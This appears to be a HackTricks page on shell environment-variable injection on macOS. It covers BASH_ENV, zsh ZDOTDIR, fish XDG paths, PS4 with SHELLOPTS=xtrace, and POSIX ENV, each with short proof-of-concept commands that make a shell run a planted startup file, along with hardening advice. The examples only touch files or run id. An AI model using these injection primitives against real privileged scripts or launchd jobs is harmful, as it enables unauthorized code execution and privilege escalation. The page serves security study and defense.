# macOS Shell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

When Bash starts non-interactively to run a script or `-c` command, it expands the value of `BASH_ENV` and sources the resulting file before executing the requested command. Bash does not use `PATH` to find this file. A process that launches non-interactive Bash with attacker-controlled environment variables can therefore be made to execute a readable shell payload first.<sup>[[1]](#references)</sup>

```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```

The hook runs only when the target actually starts Bash; `/bin/sh` on another platform or a program that executes a command without a shell will not necessarily honor it. Bash in privileged mode ignores `BASH_ENV`. When the effective and real user/group IDs differ, Bash also skips startup files and resets the effective IDs unless `-p` is supplied; with `-p`, privileged mode remains enabled and `BASH_ENV` is still ignored.<sup>[[1]](#references)[[2]](#references)</sup>

On macOS, `launchd` jobs can define inherited or per-job environment variables, so inspect plists and launch contexts that feed privileged scripts. Do not rely on SIP alone to sanitize interpreter variables: use a minimal environment (`env -i`), explicitly unset `BASH_ENV`, invoke the intended interpreter by absolute path, and avoid writable startup files.

## zsh `ZDOTDIR`

zsh reads `$ZDOTDIR/.zshenv` for every normal shell, including non-interactive shells; if `ZDOTDIR` is unset it uses `HOME`. Redirecting `ZDOTDIR` to a writable directory therefore executes its `.zshenv` before a `zsh -c` command or script.<sup>[[3]](#references)</sup>

```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```

`zsh -f` unsets the `RCS` option and skips this user startup file. The global `/etc/zshenv` is still read, so it must remain trusted and minimal.

## fish `XDG_CONFIG_HOME`

fish reads `$XDG_CONFIG_HOME/fish/conf.d/*.fish` and `$XDG_CONFIG_HOME/fish/config.fish` at the startup of every shell, not just interactive or login shells. It also executes `fish/vendor_conf.d/*.fish` below entries in `XDG_DATA_DIRS`. An attacker who controls one of these variables and a readable directory can therefore run code before a fish script or `-c` command.<sup>[[4]](#references)</sup>

```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```

Use `fish --no-config` for a trusted invocation and clear untrusted XDG path variables.

## bash `PS4` + xtrace (`SHELLOPTS`)

When Bash runs with the **xtrace** option, before every traced command it expands `PS4` and prints it. `PS4` is expanded like any prompt, so a **command substitution** inside it is executed. Both the value of `PS4` **and** the way xtrace is enabled can come purely from the environment: exporting `SHELLOPTS=xtrace` turns xtrace on for a normal `bash script.sh` (no `-x` flag needed). This turns any Bash script the victim runs into code execution.<sup>[[5]](#references)</sup>

```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` alone does nothing until xtrace is enabled (via `SHELLOPTS=xtrace`, `set -x`, or `bash -x`). Bash ignores `SHELLOPTS` in **privileged mode** (differing real/effective IDs without `-p` handling), so the same setuid caveats as `BASH_ENV` apply.

## POSIX `ENV`

The POSIX-style shells (`/bin/sh`, `dash`, `ksh`) read the `ENV` variable, expand it and source the resulting file when they start an **interactive** shell. It is the POSIX counterpart of `BASH_ENV` (which fires for *non-interactive* Bash), so control of `ENV` executes code whenever a victim spawns an interactive `sh`/`dash`.

```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```

## References

- [1] [Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Bash Invoking Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [zsh Startup/Shutdown Files](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [fish Configuration files](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Bash Variables — `PS4` and the Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)

{{#include ../../../banners/hacktricks-training.md}}
